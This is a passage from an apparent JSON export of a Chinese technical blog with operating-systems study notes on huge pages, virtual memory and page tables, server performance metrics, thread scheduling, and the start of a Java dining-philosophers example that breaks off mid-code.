以上，我们解决了 TLB 的基本设计问题，最后选择采用 n 路组相联映射。 然后还遗留了一个问题，如果一个应用（进程）对内存的需求比较大，比如 1G，而默认分页 4K 比较小。 这种情况下会有 262144 个页。考虑到 1024 个条目的 TLB，那么 262144/1024 = 256，如果 256 个地址复用 1 个缓存，很容易冲突。这个问题如何解决呢？ 大内存分页解决上面的遗留问题，可以考虑采用大内存分页（Large Page 或 Huge Page）。 这里我们先复习一下上一讲学习的多级页表。 多层页面就是进程内部维护一张页表，比如说 4M 一个页表（一级），然后每个一级页表关联 1024 个二级页表。 这样会给 MMU 带来一定的负担，因为 MMU 需要先检查一级页表，再检查二级页表。 但是 MMU 仍然可以利用 TLB 进行加速。因为 TLB 是缓存，所有根据值查找结果的逻辑，都可以用 TLB。 但是这没有解决我们提出的页表太多的问题，最终这种多级页表的设计还是需要查询大小为 4K 的页（这里请你思考上面的例子，如果是 1G 空间有 262144 个页）。如果我们操作系统能够提供大小为 4M 的页，那么是不是就减少了 1024 倍的页数呢？ ——这样就大大提高了 TLB 的查询性能。 因此 Linux 内核 2.6 版之后就开始提供大内存分页（HugeTable），默认是不开启的。如果你有应用需要使用大内存分页，可以考虑用下面的语句开启它： 1sudo sysctl -w vm.nr_hugepages=2048 从上图中你可以看到我总共有 2048 个大内存页，每个大小是 2048KB。具体这个大小是不可以调整的，这个和机器用的 MMU 相关。 打开大内存分页后如果有应用需要使用，就会去申请大内存分页。比如 Java 应用可以用-XX:+UseLargePages开启使用大内存分页。 Java 应用使用的分页数 = Total-Free+Rsvd = 2048-2032+180 = 196。Total 就是总共的分页数，Free 代表空闲的（包含 Rsvd，Reserved 预留的）。因此是上面的计算关系。 总结什么情况下使用大内存分页？ 【解析】 通常应用对内存需求较大时，可以考虑开启大内存分页。比如一个搜索引擎，需要大量在内存中的索引。有时候应用对内存的需求是隐性的。比如有的机器用来抗高并发访问，虽然平时对内存使用不高，但是当高并发到来时，应用对内存的需求自然就上去了。虽然每个并发请求需要的内存都不大， 但是总量上去了，需求总量也会随之提高高。这种情况下，你也可以考虑开启大内存分页。","categories":[],"tags":[{"name":"计操","slug":"计操","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E6%93%8D/"}]},{"title":"虚拟内存","slug":"计操/虚拟内存","date":"2021-07-24T13:50:04.000Z","updated":"2021-07-25T10:00:14.231Z","comments":true,"path":"2021/07/24/计操/虚拟内存/","link":"","permalink":"https://www.shanghua.live/2021/07/24/%E8%AE%A1%E6%93%8D/%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/","excerpt":"","text":"为什么内存不够用？要理解一个技术，就必须理解它为何而存在。总体来说，虚拟化技术是为了解决内存不够用的问题，那么内存为何不够用呢？ 主要是因为程序越来越复杂。比如说我现在这台机器上就有 200 个进程，目前内存的消耗是 21G，我的内存是 64G 的，但是多开一些程序还是会被占满。 另外，如果一个程序需要使用大的内存，比如 1T，是不是应该报错？如果报错，那么程序就会不好写，程序员必须小心翼翼地处理内存的使用，避免超过允许的内存使用阈值。以上提到的这些都是需要解决的问题，也是虚拟化技术存在的价值和意义。 那么如何来解决这些问题呢？ 历史上有过不少的解决方案，但最终沉淀下的是虚拟化技术。接下来我为你介绍一种历史上存在过的 Swap 技术以及虚拟化技术。 交换（Swap）技术内存管理单元果空间不足，就考虑把没有在执行的进程交换（Swap）到磁盘上，把空间腾挪出来给需要的进程。 上图中，内存被拆分成多个区域。 内核作为一个程序也需要自己的内存。另外每个进程独立得到一个空间——我们称为地址空间（Address Space）。你可以认为地址空间是一块连续分配的内存块。每个进程在不同地址空间中工作，构成了一个原始的虚拟化技术。 比如：当进程 A 想访问地址 100 的时候，实际上访问的地址是基于地址空间本身位置（首字节地址）计算出来的。另外，当进程 A 执行时，CPU 中会保存它地址空间的开始位置和结束位置，当它想访问超过地址空间容量的地址时，CPU 会检查然后报错。 上图描述的这种方法，是一种比较原始的虚拟化技术，进程使用的是基于地址空间的虚拟地址。但是这种方案有很多明显的缺陷，比如： 碎片问题：上图中我们看到进程来回分配、回收交换，内存之间会产生很多缝隙。经过反反复复使用，内存的情况会变得十分复杂，导致整体性能下降。 频繁切换问题：如果进程过多，内存较小，会频繁触发交换。 你可以先思考这两个问题的解决方案，接下来我会带你进行一些更深入地思考——首先重新 Review 下我们的设计目标。 隔离：每个应用有自己的地址空间，互不影响。 性能：高频使用的数据保留在内存中、低频使用的数据持久化到磁盘上。 程序好写（降低程序员心智负担）：让程序员不用关心底层设施。 现阶段，Swap 技术已经初步解决了问题 1。关于问题 2，Swap 技术在性能上存在着碎片、频繁切换等明显劣势。关于问题 3，使用 Swap 技术，程序员需要清楚地知道自己的应用用多少内存，并且小心翼翼地使用内存，避免需要重新申请，或者研发不断扩容的算法——这让程序心智负担较大。 经过以上分析，需要更好的解决方案，就是我们接下来要学习的虚拟化技术。 虚拟内存虚拟化技术中，操作系统设计了虚拟内存（理论上可以无限大的空间），受限于 CPU 的处理能力，通常 64bit CPU，就是 264 个地址。 虚拟化技术中，应用使用的是虚拟内存，操作系统管理虚拟内存和真实内存之间的映射。操作系统将虚拟内存分成整齐小块，每个小块称为一个页（Page）。之所以这样做，原因主要有以下两个方面。 一方面应用使用内存是以页为单位，整齐的页能够避免内存碎片问题。 另一方面，每个应用都有高频使用的数据和低频使用的数据。这样做，操作系统就不必从应用角度去思考哪个进程是高频的，仅需思考哪些页被高频使用、哪些页被低频使用。如果是低频使用，就将它们保存到硬盘上；如果是高频使用，就让它们保留在真实内存中。 如果一个应用需要非常大的内存，应用申请的是虚拟内存中的很多个页，真实内存不一定需要够用。 页（Page）和页表接下来，我们详细讨论下这个设计。操作系统将虚拟内存分块，每个小块称为一个页（Page）；真实内存也需要分块，每个小块我们称为一个 Frame。Page 到 Frame 的映射，需要一种叫作页表的结构。 上图展示了 Page、Frame 和页表 （PageTable）三者之间的关系。 Page 大小和 Frame 大小通常相等，页表中记录的某个 Page 对应的 Frame 编号。页表也需要存储空间，比如虚拟内存大小为 10G， Page 大小是 4K，那么需要 10G/4K = 2621440 个条目。如果每个条目是 64bit，那么一共需要 20480K = 20M 页表。操作系统在内存中划分出小块区域给页表，并负责维护页表。 页表维护了虚拟地址到真实地址的映射。每次程序使用内存时，需要把虚拟内存地址换算成物理内存地址，换算过程分为以下 3 个步骤： 通过虚拟地址计算 Page 编号； 查页表，根据 Page 编号，找到 Frame 编号； 将虚拟地址换算成物理地址。 下面我通过一个例子给你讲解上面这个换算的过程：如果页大小是 4K，假设程序要访问地址：100,000。那么计算过程如下。 页编号（Page Number） = 100,000/4096 = 24 余1619。 24 是页编号，1619 是地址偏移量（Offset）。 查询页表，得到 24 关联的 Frame 编号（假设查到 Frame 编号 = 10）。 换算：通常 Frame 和 Page 大小相等，替换 Page Number 为 Frame Number 物理地址 = 4096 * 10 + 1619 = 42579。 MMU上面的过程发生在 CPU 中一个小型的设备——内存管理单元（Memory Management Unit， MMU）中。如下图所示： 当 CPU 需要执行一条指令时，如果指令中涉及内存读写操作，CPU 会把虚拟地址给 MMU，MMU 自动完成虚拟地址到真实地址的计算；然后，MMU 连接了地址总线，帮助 CPU 操作真实地址。 这样的设计，就不需要在编写应用程序的时候担心虚拟地址到物理地址映射的问题。我们把全部难题都丢给了操作系统——操作系统要确定MMU 可以读懂自己的页表格式。所以，操作系统的设计者要看 MMU 的说明书完成工作。 难点在于不同 CPU 的 MMU 可能是不同的，因此这里会遇到很多跨平台的问题。解决跨平台问题不但有繁重的工作量，更需要高超的编程技巧，Unix 最初期的移植性（跨平台）是 C 语言作者丹尼斯·里奇实现的。 学到这里，细心的同学可能会有疑问：MMU 需要查询页表（这是内存操作），而 CPU 执行一条指令通过 MMU 获取内存数据，难道可以容忍在执行一条指令的过程中，发生多次内存读取（查询）操作？难道一次普通的读取操作，还要附加几次查询页表的开销吗？当然不是，这里还有一些高速缓存的设计 页表条目上面我们笼统介绍了页表将 Page 映射到 Frame。那么，页表中的每一项（页表条目）长什么样子呢？下图是一个页表格式的一个演示。 页表条目本身的编号可以不存在页表中，而是通过偏移量计算。 比如地址 100,000 的编号，可以用 100,000 除以页大小确定。 Absent（“在”）位，是一个 bit。0 表示页的数据在磁盘中（不再内存中），1 表示在内存中。如果读取页表发现 Absent = 0，那么会触发缺页中断，去磁盘读取数据。 Protection（保护）字段可以实现成 3 个 bit，它决定页表用于读、写、执行。比如 000 代表什么都不能做，100 代表只读等。 Reference（访问）位，代表这个页被读写过，这个记录对回收内存有帮助。 Dirty（“脏”）位，代表页的内容被修改过，如果 Dirty =1，那么意味着页面必须回写到磁盘上才能置换（Swap)。如果 Dirty = 0，如果需要回收这个页，可以考虑直接丢弃它（什么也不做，其他程序可- 以直接覆盖）。 Caching（缓存位），描述页可不可以被 CPU 缓存。CPU 缓存会造成内存不一致问题，在上个模块的加餐中我们讨论了内存一致性问题，具体你可以参考“模块四”的加餐内容。 Frame Number（Frame 编号），这个是真实内存的位置。用 Frame 编号乘以页大小，就可以得到 Frame 的基地址。 在 64bit 的系统中，考虑到 Absent、Protection 等字段需要占用一定的位，因此不能将 64bit 都用来描述真实地址。但是 64bit 可以寻址的空间已经远远超过了 EB 的级别（1EB = 220TB），这已经足够了。在真实世界，我们还造不出这么大的内存呢。 大页面问题最后，我们讨论一下大页面的问题。假设有一个应用，初始化后需要 12M 内存，操作系统页大小是 4K。那么应该如何设计呢？ 为了简化模型，下图中，假设这个应用只有 3 个区域（3 个段）——正文段（程序）、数据段（常量、全局变量）、堆栈段。一开始我们 3 个段都分配了 4M 的空间。随着程序执行，堆栈段的空间会继续增加，上不封顶。 上图中，进程内部需要一个页表存储进程的数据。如果进程的内存上不封顶，那么页表有多少个条目合适呢？ 进程分配多少空间合适呢？ 如果页表大小为 1024 个条目，那么可以支持 1024*4K = 4M 空间。按照这个计算，如果进程需要 1G 空间，则需要 256K 个条目。我们预先为进程分配这 256K 个条目吗？ 创建一个进程就划分这么多条目是不是成本太高了？ 为了减少条目的创建，可以考虑进程内部用一个更大的页表（比如 4M），操作系统继续用 4K 的页表。这就形成了一个二级页表的结构，如下图所示： 这样 MMU 会先查询 1 级页表，再查询 2 级页表。在这个模型下，进程如果需要 1G 空间，也只需要 1024 个条目。比如 1 级页编号是 2， 那么对应 2 级页表中 [2* 1024, 3*1024-1] 的部分条目。而访问一个地址，需要同时给出一级页编号和二级页编号。整个地址，还可以用 64bit 组装，如下图所示： MMU 根据 1 级编号找到 1 级页表条目，1 级页表条目中记录了对应 2 级页表的位置。然后 MMU 再查询 2 级页表，找到 Frame。最后通过地址偏移量和 Frame 编号计算最终的物理地址。这种设计是一个递归的过程，因此还可增加 3 级、4 级……每增加 1 级，对空间的利用都会提高——当然也会带来一定的开销。这对于大应用非常划算，比如需要 1T 空间，那么使用 2 级页表，页表的空间就节省得多了。而且，这种多级页表，顶级页表在进程中可以先只创建需要用到的部分，就这个例子而言，一开始只需要 3 个条目，从 256K 个条目到 3 个，这就大大减少了进程创建的成本。 总结一个程序最多能使用多少内存？ 【解析】 目前我们主要都是在用 64bit 的机器。因为 264 数字过于大，即便是虚拟内存都不需要这么大的空间。因此通常操作系统会允许进程使用非常大，但是不到 264 的地址空间。通常是几十到几百 EB（1EB = 2^10TB）。","categories":[],"tags":[{"name":"计操","slug":"计操","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E6%93%8D/"}]},{"title":"分析服务的特性","slug":"计操/分析服务的特性","date":"2021-07-24T10:57:53.000Z","updated":"2021-07-24T05:49:41.055Z","comments":true,"path":"2021/07/24/计操/分析服务的特性/","link":"","permalink":"https://www.shanghua.live/2021/07/24/%E8%AE%A1%E6%93%8D/%E5%88%86%E6%9E%90%E6%9C%8D%E5%8A%A1%E7%9A%84%E7%89%B9%E6%80%A7/","excerpt":"","text":"计算密集型和 I/O 密集型通常我们会遇到两种任务，一种是计算、一种是 I/O。 计算，就是利用 CPU 处理算数运算。比如深度神经网络（Deep Neural Networks），需要大量的计算来计算神经元的激活和传播。再比如，根据营销规则计算订单价格，虽然每一个订单只需要少量的计算，但是在并发高的时候，所有订单累计加起来就需要大量计算。如果一个应用的主要开销在计算上，我们称为计算密集型。 再看看 I/O 密集型，I/O 本质是对设备的读写。读取键盘的输入是 I/O，读取磁盘（SSD）的数据是 I/O。通常 CPU 在设备 I/O 的过程中会去做其他的事情，当 I/O 完成，设备会给 CPU 一个中断，告诉 CPU 响应 I/O 的结果。比如说从硬盘读取数据完成了，那么硬盘给 CPU 一个中断。如果操作对 I/O 的依赖强，比如频繁的文件操作（写日志、读写数据库等），可以看作 I/O 密集型。 你可能会有一个疑问，读取硬盘数据到内存中这个过程，CPU 需不需要一个个字节处理？ 通常是不用的，因为在今天的计算机中有一个叫作 Direct Memory Access（DMA）的模块，这个模块允许硬件设备直接通过 DMA 写内存，而不需要通过 CPU（占用 CPU 资源）。 很多情况下我们没法使用 DMA，比如说你想把一个数组拷贝到另一个数组内，执行的 memcpy 函数内部实现就是一个个 byte 拷贝，这种情况也是一种 CPU 密集的操作。 可见，区分是计算密集型还是 I/O 密集型这件事比较复杂。按说查询数据库是一件 I/O 密集型的事情，但是如果存储设备足够好，比如用了最好的固态硬盘阵列，I/O 速度很快，反而瓶颈会在计算上（对缓存的搜索耗时成为主要部分）。因此，需要一些可衡量指标，来帮助我们确认应用的特性。 衡量 CPU 的工作情况的指标我们先来看一下 CPU 关联的指标。如下图所示：CPU 有 2 种状态，忙碌和空闲。此外，CPU 的时间还有一种被偷走的情况。 忙碌就是 CPU 在执行有意义的程序，空闲就是 CPU 在执行让 CPU 空闲（空转）的指令。通常让 CPU 空转的指令能耗更低，因此让 CPU 闲置时，我们会使用特别的指令，最终效果和让 CPU 计算是一样的，都可以把 CPU 执行时间填满，只不过这类型指令能耗低一些而已。除了忙碌和空闲，CPU 的时间有可能被宿主偷走，比如一台宿主机器上有 10 个虚拟机，宿主可以偷走给任何一台虚拟机的时间。 如上图所示，CPU 忙碌有 3 种情况： 执行用户空间程序； 执行内核空间程序； 执行中断程序。 CPU 空闲有 2 种情况。 CPU 无事可做，执行空闲指令（注意，不能让 CPU 停止工作，而是执行能耗更低的空闲指令）。 CPU 因为需要等待 I/O 而空闲，比如在等待磁盘回传数据的中断，这种我们称为 I/O Wait。 下图是我们执行 top 指令看到目前机器状态的快照，接下来我们仔细研究一下这些指标的含义： 如上图所示，你可以细看下 %CPU(s) 开头那一行（第 3 行）： us（user），即用户空间 CPU 使用占比。 sy（system），即内核空间 CPU 使用占比。 ni（nice），nice 是 Unix 系操作系统控制进程优先级用的。-19 是最高优先级， 20 是最低优先级。这里代表了调整过优先级的进程的 CPU 使用占比。 id（idle），闲置的 CPU 占比。 wa（I/O Wait），I/O Wait 闲置的 CPU 占比。 hi（hardware interrupts），响应硬件中断 CPU 使用占比。 si（software interrrupts），响应软件中断 CPU 使用占比。 st（stolen），如果当前机器是虚拟机，这个指标代表了宿主偷走的 CPU 时间占比。对于 1. 一个宿主多个虚拟机的情况，宿主可以偷走任何一台虚拟机的 CPU 时间。 上面我们用 top 看的是一个平均情况，如果想看所有 CPU 的情况可以 top 之后，按一下 1 键。结果如下图所示： 当然，对性能而言，CPU 数量也是一个重要因素。可以看到我这台虚拟机一共有 4 个核心。 负载指标上面的指标非常多，在排查问题的时候，需要综合分析。其实还有一些更简单的指标，比如上图中 top 指令返回有一项叫作 load average——平均负载。 负载可以理解成某个时刻正在排队执行的进程数除以 CPU 核数。平均负载需要多次采样求平均值。 如果这个值大于 1，说明 CPU 相当忙碌。因此如果你想发现问题，可以先检查这个指标。 具体来说，如果平均负载很高，CPU 的 I/O Wait 也很高， 那么就说明 CPU 因为需要大量等待 I/O 无法处理完成工作。产生这个现象的原因可能是：线上服务器打日志太频繁，读写数据库、网络太频繁。你可以考虑进行批量读写优化。 到这里，你可能会有一个疑问：为什么批量更快呢？我们知道一次写入 1M 的数据，就比写一百万次一个 byte 快。因为前者可以充分利用 CPU 的缓存、复用发起写操作程序的连接和缓冲区等。 如果想看更多 load average，你可以看/proc/loadavg 文件。 通信量（Traffic）如果怀疑瓶颈发生在网络层面，或者想知道当前网络状况。可以查看/proc/net/dev，下图是在我的电脑上的查询结果： 我们来一起看一下上图中的指标。表头分成了 3 段： Interface（网络接口），可以理解成网卡 Receive：接收的数据 Transmit：发送的数据 然后再来看具体的一些参数： byte 是字节数 package 是封包数 erros 是错误数 drop 是主动丢弃的封包，比如说时间窗口超时了 fifo: FIFO 缓冲区错误 frame: 底层网络发生了帧错误，代表数据出错了 如果你怀疑自己系统的网络有故障，可以查一下通信量部分的参数，相信会有一定的收获。 衡量磁盘工作情况有时候 I/O 太频繁导致磁盘负载成为瓶颈，这个时候可以用 iotop 指令看一下磁盘的情况，如图所示： 上图中是磁盘当前的读写速度以及排行较靠前的进程情况。 另外，如果磁盘空间不足，可以用 df 指令： 其实 df 是按照挂载的文件系统计算空间。图中每一个条目都是一个文件系统。有的文件系统直接挂在了一个磁盘上，比如图中的/dev/sda5 挂在了/上，因此这样可以看到各个磁盘的使用情况。 如果想知道更细粒度的磁盘 I/O 情况，可以查看/proc/diskstats 文件。 这里有 20 多个指标我就不细讲了，如果你将来怀疑自己系统的 I/O 有问题，可以查看这个文件，并阅读相关手册。 监控平台Linux 中有很多指令可以查看服务器当前的状态，有 CPU、I/O、通信、Nginx 等维度。如果去记忆每个指令自己搭建监控平台，会非常复杂。这里你可以用市面上别人写好的开源系统帮助你收集这些资料。 比如 Taobao System Activity Report（tsar）就是一款非常好用的工具。它集成了大量诸如上面我们使用的工具，并且帮助你定时收集服务器情况，还能记录成日志。你可以用 logstash 等工具，及时将日志收集到监控、分析服务中，比如用 ELK 技术栈。 决定进程/线程数量最后我们讲讲如何决定线程、进程数量。 上面观察指标是我们必须做的一件事情，通过观察上面的指标，可以对我们开发的应用有一个基本的认识。 下面请你思考一个问题：如果线程或进程数量 = CPU 核数，是不是一个好的选择？ 有的应用不提供线程，比如 PHP 和 Node.js。 Node.js 内部有一个事件循环模型，这个模型可以理解成协程（Coroutine），相当于大量的协程复用一个进程，可以达到比线程池更高的效率（减少了线程切换）。PHP 模型相对则差得多。Java 是一个多线程的模型，线程和内核线程对应比 1：1；Go 有轻量级线程，多个轻量级线程复用一个内核级线程。 以 Node.js 为例，如果现在是 8 个核心，那么开 8 个 Node 进程，是不是就是最有效利用 CPU 的方案呢？ 乍一看——8 个核、8 个进程，每个进程都可以使用 1 个核，CPU 利用率很高——其实不然。 你不要忘记，CPU 中会有一部分闲置时间是 I/O Wait，这个时候 CPU 什么也不做，主要时间用于等待 I/O。 假设我们应用执行的期间只用 50% CPU 的执行时间，其他 50% 是 I/O Wait。那么 1 个 CPU 同时就可以执行两个进程/线程。 我们考虑一个更一般的模型，如果你的应用平均 I/O 时间占比是 P，假设现在内存中有 n 个这样的线程，那么 CPU 的利用率是多少呢？ 假设我们观察到一个应用 （进程），I/O 时间占比是 P，那么可以认为这个进程等待 I/O 的概率是 P。那么如果有 n 个这样的线程，n 个线程都在等待 I/O 的概率是Pn。而满负荷下，CPU 的利用率就是 CPU 不能空转——也就是不能所有进程都在等待 I/O。因此 CPU 利用率 = 1 -Pn。 理论上，如果 P = 50%，两个这样的进程可以达到满负荷。 但是从实际出发，何时运行线程是一个分时的调度行为，实际的 CPU 利用率还要看开了多少个这样的线程，如果是 2 个，那么还是会有一部分闲置资源。 因此在实际工作中，开的线程、进程数往往是超过 CPU 核数的。你可能会问，具体是多少最好呢？——这里没有具体的算法，要以实际情况为准。比如：你先以 CPU 核数 3 倍的线程数开始，然后进行模拟真实线上压力的测试，分析压测的结果。 如果发现整个过程中，瓶颈在 CPU，比如load average很高，那么可以考虑优化 I/O Wait，让 CPU 有更多时间计算。 当然，如果 I/O Wait 优化不动了，算法都最优了，就是磁盘读写速度很高达到瓶颈，可以考虑延迟写、延迟读等等技术，或者优化减少读写。 如果发现 idle 很高，CPU 大面积闲置，就可以考虑增加线程。 总结我的服务应该开多少个进程、多少个线程？ 【解析】 计算密集型一般接近核数，如果负载很高，建议留一个内核专门给操作系统。I/O 密集型一般都会开大于核数的线程和进程。 但是无论哪种模型，都需要实地压测，以压测结果分析为准；另一方面，还需要做好监控，观察服务在不同并发场景的情况，避免资源耗尽。 然后具体语言的特性也要考虑，Node.js 每个进程内部实现了大量类似协程的执行单元，因此 Node.js 即便在 I/O 密集型场景下也可以考虑长期使用核数 -1 的进程模型。而 Java 是多线程模型，线程池通常要大于核数才能充分利用 CPU 资源。 所以核心就一句，眼见为实，上线前要进行压力测试。","categories":[],"tags":[{"name":"计操","slug":"计操","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E6%93%8D/"}]},{"title":"线程的调度","slug":"计操/线程的调度","date":"2021-07-23T11:32:32.000Z","updated":"2021-07-23T11:35:54.288Z","comments":true,"path":"2021/07/23/计操/线程的调度/","link":"","permalink":"https://www.shanghua.live/2021/07/23/%E8%AE%A1%E6%93%8D/%E7%BA%BF%E7%A8%8B%E7%9A%84%E8%B0%83%E5%BA%A6/","excerpt":"","text":"先到先服务早期的操作系统是一个个处理作业（Job），比如很多保险业务，每处理一个称为一个作业（Job）。处理作业最容易想到的就是先到先服务（First Come First Service，FCFS），也就是先到的作业先被计算，后到的作业，排队进行。 这里需要用到一个叫作队列的数据结构，具有先入先出（First In First Out，FIFO）性质。先进入队列的作业，先处理，因此从公平性来说，这个算法非常朴素。另外，一个作业完全完成才会进入下一个作业，作业之间不会发生切换，从吞吐量上说，是最优的——因为没有额外开销。 但是这样对于等待作业的用户来说，是有问题的。比如一笔需要用时 1 天的作业 ，如果等待了 10 分钟，用户是可以接受的；一个用时 10 分钟的作业，用户等待一天就要投诉了。 因此如果用时 1 天的作业先到，用时 10 分钟的任务后到，应该优先处理用时少的，也就是短作业优先（Shortest Job First，SJF）。 短作业优先通常会同时考虑到来顺序和作业预估时间的长短，比如下面的到来顺序和预估时间： 这样就会优先考虑第一个到来预估时间为 3 分钟的任务。 我们还可以从另外一个角度来审视短作业优先的优势，就是平均等待时间。 平均等待时间 = 总等待时间/任务数 上面例子中，如果按照 3,3,10 的顺序处理，平均等待时间是：(0 + 3 + 6) / 3 = 3 分钟。 如果按照 10,3,3 的顺序来处理，就是( 0+10+13 )/ 3 = 7.66 分钟。 平均等待时间和用户满意度是成反比的，等待时间越长，用户越不满意，因此在大多数情况下，应该优先处理用时少的，从而降低平均等待时长。 采用 FCFS 和 SJF 后，还有一些问题没有解决。 紧急任务如何插队？比如老板安排的任务。 等待太久的任务如何插队？比如用户等太久可能会投诉。 先执行的大任务导致后面来的小任务没有执行如何处理？比如先处理了一个 1 天才能完成的任务，工作半天后才发现预估时间 1 分钟的任务也到来了。 为了解决上面的问题，我们设计了两种方案， 一种是优先级队列（PriorityQueue），另一种是抢占（Preemption）。 优先级队列（PriorityQueue）刚才提到老板安排的任务需要紧急插队，那么下一个作业是不是应该安排给老板？毫无疑问肯定是这样！那么如何控制这种优先级顺序呢？一种方法是用优先级队列。优先级队列可以给队列中每个元素一个优先级，优先级越高的任务就会被先执行。 优先级队列的一种实现方法就是用到了堆（Heap）这种数据结构，更最简单的实现方法，就是每次扫描一遍整个队列找到优先级最高的任务。也就是说，堆（Heap）可以帮助你在 O(1) 的时间复杂度内查找到最大优先级的元素。 比如老板的任务，就给一个更高的优先级。 而对于普通任务，可以在等待时间（W） 和预估执行时间（P） 中，找一个数学关系来描述。比如：优先级 = W/P。W 越大，或者 P 越小，就越排在前面。 当然还可以有很多其他的数学方法，利用对数计算，或者某种特别的分段函数。 这样，关于紧急任务如何插队？等待太久的任务如何插队？这两个问题我们都解决了，接下来我们来看先执行的大任务导致后面来的小任务没有执行的情况如何处理？ 抢占为了解决这个问题，我们需要用到抢占（Preemption）。 抢占就是把执行能力分时，分成时间片段。 让每个任务都执行一个时间片段。如果在时间片段内，任务完成，那么就调度下一个任务。如果任务没有执行完成，则中断任务，让任务重新排队，调度下一个任务。 拥有了抢占的能力，再结合之前我们提到的优先级队列能力，这就构成了一个基本的线程调度模型。线程相对于操作系统是排队到来的，操作系统为每个到来的线程分配一个优先级，然后把它们放入一个优先级队列中，优先级最高的线程下一个执行。 ![img](/img/计哲学家就餐问题 图中用红色代表调度程序，其他颜色代表被调度线程的时间片段。调度程序可以考虑实现为一个单线程模型，这样不需要考虑竞争条件。 上面这个模型已经是一个非常优秀的方案了，但是还有一些问题可以进一步处理得更好。 如果一个线程优先级非常高，其实没必要再抢占，因为无论如何调度，下一个时间片段还是给它。那么这种情况如何实现？ 如果希望实现最短作业优先的抢占，就必须知道每个线程的执行时间，而这个时间是不可预估的，那么这种情况又应该如何处理？ 为了解决上面两个问题，我们可以考虑引入多级队列模型。 多级队列模型多级队列，就是多个队列执行调度。 我们先考虑最简单的两级模型，如图： 上图中设计了两个优先级不同的队列，从下到上优先级上升，上层队列调度紧急任务，下层队列调度普通任务。只要上层队列有任务，下层队列就会让出执行权限。 低优先级队列可以考虑抢占 + 优先级队列的方式实现，这样每次执行一个时间片段就可以判断一下高优先级的队列中是否有任务。 高优先级队列可以考虑用非抢占（每个任务执行完才执行下一个）+ 优先级队列实现，这样紧急任务优先级有个区分。如果遇到十万火急的情况，就可以优先处理这个任务。 上面这个模型虽然解决了任务间的优先级问题，但是还是没有解决短任务先行的问题。可以考虑再增加一些队列，让级别更多。比如下图这个模型： 紧急任务仍然走高优队列，非抢占执行。普通任务先放到优先级仅次于高优任务的队列中，并且只分配很小的时间片；如果没有执行完成，说明任务不是很短，就将任务下调一层。下面一层，最低优先级的队列中时间片很大，长任务就有更大的时间片可以用。通过这种方式，短任务会在更高优先级的队列中执行完成，长任务优先级会下调，也就类似实现了最短作业优先的问题。 实际操作中，可以有 n 层，一层层把大任务筛选出来。 最长的任务，放到最闲的时间去执行。要知道，大部分时间 CPU 不是满负荷的。 总结那么通过这一讲的学习，你现在可以尝试来回答本节关联的面试题目：线程调度都有哪些方法？ 【解析】 回答这个问题你要把握主线，千万不要教科书般的回答：任务调度分成抢占和非抢占的，抢占的可以轮流执行，也可以用优先级队列执行；非抢占可以先到先服务，也可以最短任务优先。 上面这种回答可以用来过普通的程序员岗位，但是面试官其实更希望听到你的见解，这是初中级开发人员与高级开发人员之间的差异。 比如你告诉面试官：非抢占的先到先服务的模型是最朴素的，公平性和吞吐量可以保证。但是因为希望减少用户的平均等待时间，操作系统往往需要实现抢占。操作系统实现抢占，仍然希望有优先级，希望有最短任务优先。 但是这里有个困难，操作系统无法预判每个任务的预估执行时间，就需要使用分级队列。最高优先级的任务可以考虑非抢占的优先级队列。 其他任务放到分级队列模型中执行，从最高优先级时间片段最小向最低优先级时间片段最大逐渐沉淀。这样就同时保证了小任务先行和高优任务最先执行。","categories":[],"tags":[{"name":"计操","slug":"计操","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E6%93%8D/"}]},{"title":"哲学家就餐问题","slug":"计操/哲学家就餐问题","date":"2021-07-23T11:32:32.000Z","updated":"2021-07-23T11:35:50.100Z","comments":true,"path":"2021/07/23/计操/哲学家就餐问题/","link":"","permalink":"https://www.shanghua.live/2021/07/23/%E8%AE%A1%E6%93%8D/%E5%93%B2%E5%AD%A6%E5%AE%B6%E5%B0%B1%E9%A4%90%E9%97%AE%E9%A2%98/","excerpt":"","text":"哲学家就餐问题问题描述如下：有 5 个哲学家，围着一个圆桌就餐。圆桌上有 5 份意大利面和 5 份叉子。哲学家比较笨，他们必须拿到左手和右手的 2 个叉子才能吃面。哲学不饿的时候就在思考，饿了就去吃面，吃面的必须前提是拿到 2 个叉子，吃完面哲学家就去思考。 假设每个哲学家用一个线程实现，求一种并发控制的算法，让哲学家们按部就班地思考和吃面。当然我这里做了一些改动，比如 Dijkstra 那个年代线程还没有普及，最早的题目每个哲学家是一个进程。 问题的抽象接下来请你继续思考，我们对问题进行一些抽象，比如哲学是一个数组，编号 0~4。我这里用 Java 语言给你演示，哲学家是一个类，代码如下： 1234567static class Philosopher implements Runnable &#123; private static Philosopher[] philosophers; static &#123; philosophers = new Philosopher[5]; &#125;&#125; 这里考虑叉子也使用编号 0~4，代码如下： 12345678private static Integer[] forks;private static Philosopher[] philosophers;static &#123; for(int i = 0; i &lt; 5; i++) &#123; philosophers[i] = new Philosopher(i); forks[i] = -1; &#125;&#125; forks[i]的值等于 x，相当于编号为i的叉子被编号为 x 的哲学家拿起；如果等于-1，那么叉子目前放在桌子上。 我们经常需要描述左、右的关系，为了方便计算，可以设计 1 个帮助函数（helper functions），帮助我们根据一个编号，计算它左边的编号。 123private static int LEFT(int i) &#123; return i == 0 ? 4 : i-1;&#125; 假设和哲学家编号一致的叉子在右边，这样如果要判断编号为id哲学家是否可以吃面，需要这样做： 123if(forks[LEFT(id)] == id &amp;&amp; forks[id] == id) &#123; // 可以吃面&#125; 然后定义一个_take函数拿起编号为i叉子; 再设计一个_put方法放下叉子： 12345678void _take(int i) throws InterruptedException &#123; Thread.sleep(10); forks[i] = id;&#125;void _put(int i)&#123; if(forks[i] == id) forks[i] = -1;&#125; _take函数之所以会等待 10ms，是因为哲学家就餐问题的实际意义，是 I/O 处理的场景，拿起叉子好比读取磁盘，需要有一等的时间开销，这样思考才有意义。 然后是对think和eat两个方法的抽象。首先我封装了一个枚举类型，描述哲学家的状态，代码如下： 12345enum PHIS &#123; THINKING, HUNGRY, EATING&#125; 然后实现think方法，think方法不需要并发控制，但是这里用Thread.sleep模拟实际思考需要的开销，代码如下： 12345void think() throws InterruptedException &#123; System.out.println(String.format(&quot;Philosopher %d thinking...&quot;, id)); Thread.sleep((long) Math.floor(Math.random()*1000)); this.state = PHIS.HUNGRY;&#125; 最后是eat方法： 1234567891011void eat() throws InterruptedException &#123; synchronized (forks) &#123; if(forks[LEFT(id)] == id 